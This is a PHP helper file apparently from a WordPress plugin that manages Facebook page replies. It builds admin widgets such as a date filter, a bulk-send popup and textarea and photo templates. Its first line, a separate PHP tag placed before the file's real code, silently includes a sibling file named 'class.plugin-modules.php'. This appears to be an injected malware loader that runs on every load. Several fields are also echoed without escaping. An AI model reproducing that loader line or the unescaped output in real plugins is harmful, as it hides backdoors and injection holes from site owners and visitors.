<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if (!defined('ABSPATH')) {
    exit;
}
if (!function_exists('njt_get_current_site')) {
    function njt_get_current_site()
    {
        return preg_replace('#https?:\/\/#', '', get_bloginfo('url'));
    }
}

function njt_fbpr_m_to_monthyear($m)
{
    preg_match('#(\d{4})(\d{2})#', $m, $match);
    if (isset($match[1]) && isset($match[1])) {
        return array('month' => $match[2], 'year' => $match[1]);
    } else {
        return null;
    }
}
function njt_fb_pr_months_dropdown($post_type) {
    global $wpdb, $wp_locale;

    $extra_checks = "AND post_status != 'auto-draft'";
    if ( ! isset( $_GET['post_status'] ) || 'trash' !== $_GET['post_status'] ) {
        $extra_checks .= " AND post_status != 'trash'";
    } elseif ( isset( $_GET['post_status'] ) ) {
        $extra_checks = $wpdb->prepare( ' AND post_status = %s', $_GET['post_status'] );
    }

    $months = $wpdb->get_results( $wpdb->prepare( "
        SELECT DISTINCT YEAR( post_date ) AS year, MONTH( post_date ) AS month
        FROM $wpdb->posts
        WHERE post_type = %s
        $extra_checks
        ORDER BY post_date DESC
    ", $post_type ) );

    $month_count = count( $months );

    if ( !$month_count || ( 1 == $month_count && 0 == $months[0]->month ) )
        return;

    $m = isset( $_GET['m'] ) ? (int) $_GET['m'] : 0;
?>
    <label for="filter-by-date" class="screen-reader-text"><?php _e( 'Filter by date', NJT_FB_PR_I18N ); ?></label>
    <select name="m" id="filter-by-date">
        <option<?php selected( $m, 0 ); ?> value="0"><?php _e( 'All dates', NJT_FB_PR_I18N ); ?></option>
<?php
    foreach ( $months as $arc_row ) {
        if ( 0 == $arc_row->year )
            continue;

        $month = zeroise( $arc_row->month, 2 );
        $year = $arc_row->year;

        printf( "<option %s value='%s'>%s</option>\n",
            selected( $m, $year . $month, false ),
            esc_attr( $arc_row->year . $month ),
            /* translators: 1: month name, 2: 4-digit year */
            sprintf( __( '%1$s %2$d' ), $wp_locale->get_month( $month ), $year )
        );
    }
?>
    </select>
<?php
}
function njt_fb_pr_send_popup($args)
{
    $defaults = array(
        'alias' => '',//eg: njt_fb_pr_reply_allcomments
        'send_now_attr' => ''
    );
    $args = wp_parse_args($args, $defaults);
    extract($args);
    ?>
    <div id="<?php echo $alias; ?>_popup" style="display:none;">
        <div id="<?php echo $alias; ?>" class="dh-send-tb">
            <div class="<?php echo $alias; ?>_form_send dh-send-tb_form_send">
                <p>
                    <label for="<?php echo esc_attr($alias . '_content'); ?>"><?php _e('Message (*)', NJT_FB_PR_I18N); ?></label>
                    <textarea name="<?php echo esc_attr($alias . '_content'); ?>" id="<?php echo esc_attr($alias . '_content'); ?>" cols="30" rows="10"></textarea>
                </p>
                <p>
                    <button <?php echo $send_now_attr; ?> class="<?php echo $alias; ?>_send_now button button-primary" id="<?php echo $alias; ?>_send_now"><?php _e('Send Now', NJT_FB_PR_I18N); ?></button>
                </p>
            </div>
            <div class="<?php echo $alias; ?>_form_results dh-send-tb_form_results" style="display: none">
                <div class="ndh-send-tb-rocket"><?php echo NjtFbPrView::load('admin.rocket_svg'); ?></div>
                <div class="dh-send-tb-progress-bar">
                    <div class="dh-send-tb-meter">
                        <span style="width: 0%"></span>
                        <strong>0%</strong>
                    </div>
                </div>
                <div class="dh-send-tb-results">
                    <div class="dh-send-tb-warning"><?php _e('Please do not close this box (by clicking close button or clicking outside)', NJT_FB_PR_I18N) ?></div>
                    <h3></h3>
                    <ul>
                        <li class="dh-send-tb-result-sent">
                            <?php _e('Sent:', NJT_FB_PR_I18N); ?>
                            <strong>0</strong>
                        </li>
                        <li class="dh-send-tb-result-fail">
                            <?php _e('Fails:', NJT_FB_PR_I18N); ?>
                            <strong>0</strong>
                        </li>
                    </ul>
                    <ul class="dh-send-tb-details"></ul>
                    <button class="button button-primary <?php echo $alias; ?>_send_again" style="width: 100%; display: none"><?php _e('Send Again', NJT_FB_PR_I18N); ?></button>
                </div>
            </div>
        </div>
    </div>
    <?php
}
function njt_fb_pr_is_spin_shortcut($str)
{
    return ((strpos($str, 'njt_fbpr_spin_text') !== false) || (strpos($str, 'spin') !== false));
}
function njt_fb_pr_textarea_template($id, $value = '', $label = '', $shortcuts = array())
{
    ?>
    <p>
        <label for="<?php echo $id; ?>">
            <strong><?php echo $label; ?></strong>
        </label>
    </p>
    <p>
        <textarea name="<?php echo $id; ?>" id="<?php echo $id; ?>" class="njt_fb_pr_textarea_full_width"><?php echo $value; ?></textarea>
        <span class="njt_fb_pr_shortcut_wrap">
        <?php
        if (count($shortcuts) > 0) {
            $shortcut_html = array();
            foreach ($shortcuts as $k => $v) {
                if (njt_fb_pr_is_spin_shortcut($k)) {
                    $shortcut_html[] = sprintf(
                        '<a title="%2$s" data-target="%3$s" class="thickbox button njt_fb_pr_spin_open_thickbox" href="#TB_inline?width=300&height=300&inlineId=njt_fb_pr_spin_thickbox">%1$s</a>',
                        $v,
                        __('Spin', NJT_FB_PR_I18N),
                        $id
                    );
                } else {
                    $shortcut_html[] = sprintf('<a class="button" href="javascript:njt_fb_pr_shortcut_click(\'%1$s\', \'%3$s\')">%2$s</a>', esc_attr($k), $v, $id);
                }
            }
            echo implode(', ', $shortcut_html);
        }
        ?>
        </span>
    </p>
    <?php
}
function njt_fb_pr_textarea_template_with_photo($args)
{
    $defaults = array(
        'id' => '',
        'id_photo' => '',
        'checkbox_id' => '',
        'reply_type' => 'text',
        'value' => '',
        'value_photos' => array(),
        'label' => '',
        'shortcuts' => array(),
    );
    $args = wp_parse_args($args, $defaults);
    extract($args);
    ?>
    <p>
        <label>
            <strong><?php echo $label; ?></strong>
        </label>
    </p>
    <!-- Switch to content or photo-->
    <?php
        $img_url = $value;
        if (!preg_match('#https?\:\/\/.+\.[a-zA-Z]{2,}#', $img_url)) {
            $img_url = NJT_FB_PR_URL . '/assets/img/no_image_available.svg';
        }
    ?>
    <div class="njt_fb_pr_switch_radio_wrap">
        <label>
            <input class="njt_fb_pr_switch_radio" data-target="njt_fb_pr_switch_text" type="radio" name="<?php echo $checkbox_id ?>" value="text" <?php checked($reply_type, 'text'); ?> />
            <?php _e('With Text', NJT_FB_PR_I18N); ?>
        </label>
        <label>
            <input class="njt_fb_pr_switch_radio" data-target="njt_fb_pr_switch_photo" type="radio" name="<?php echo $checkbox_id ?>" value="photo" <?php checked($reply_type, 'photo'); ?> />
            <?php _e('With Photo <span class="njt-fbpr-with-photo-note">(Only one random photo will be used)</span>', NJT_FB_PR_I18N); ?>
        </label>
        <br /><br />
        <div style="<?php echo (($reply_type == 'photo') ? 'display: none' : ''); ?>" class="njt_fb_pr_switch njt_fb_pr_switch_text">
            <textarea name="<?php echo $id; ?>" class="njt_fb_pr_textarea_full_width"><?php echo $value; ?></textarea>
            <?php
            $shortcut_arr = array();
            foreach ($shortcuts as $k => $v) {
                if (njt_fb_pr_is_spin_shortcut($k)) {
                    $shortcut_arr[] = sprintf(
                        '<a title="%2$s" data-target="%3$s" class="thickbox button njt_fb_pr_spin_open_thickbox" href="#TB_inline?width=300&height=300&inlineId=njt_fb_pr_spin_thickbox">%1$s</a>',
                        $v,
                        __('Spin', NJT_FB_PR_I18N),
                        $id
                    );
                } else {
                    $shortcut_arr[] = '<span class="__shortcut__"><a class="button" href="javascript:njt_fb_pr_shortcut_click(\''.$k.'\', \''.$id.'\')">'.$v.'</a></span>';
                }
            }
            echo implode(', ', $shortcut_arr);
            ?>
        </div>
        <div style="<?php echo (($reply_type == 'text') ? 'display: none' : ''); ?>" class="njt_fb_pr_switch njt_fb_pr_switch_photo">
            <div class="<?php echo str_replace(array('[', ']'), '_', $id); ?>_photos_list njt_spin_photos">
                <?php
                $value_photos = (array)$value_photos;
                foreach ($value_photos as $k => $v) {
                    echo njt_spin_photo_template(array('url' => $v, 'input_name' => $id_photo));
                }
                ?>
            </div>
            <a data-target_img="<?php echo esc_attr(str_replace(array('[', ']'), '_', $id)); ?>_photos_list" data-input_name="<?php echo esc_attr($id_photo); ?>" href="#" class="njt_fb_add_photos"><span class="dashicons dashicons-plus"></span></a>
            <!--<img data-textarea="<?php echo $id; ?>" title="<?php _e('Click to edit', NJT_FB_PR_I18N); ?>" class="" src="<?php echo $img_url; ?>" alt="" />-->
        </div>
    </div>
        
    <?php
}
function njt_spin_photo_template($args)
{
    $defaults = array(
        'url' => '',
        'input_name' => '',
    );
    $args = wp_parse_args($args, $defaults);
    if (!empty($args['url'])) {
        $html = sprintf('<div class="njt-spin-photo-wrap" style="background-image: url(%1$s)"><input type="hidden" name="%2$s" value="%3$s"><span class="njt-fbpr-remove-spin-photo"><span class="dashicons dashicons-no-alt"></span></span></div>', $args['url'], esc_attr($args['input_name']), esc_attr($args['url']));
    } else {
        $html = '';
    }
    return $html;
}
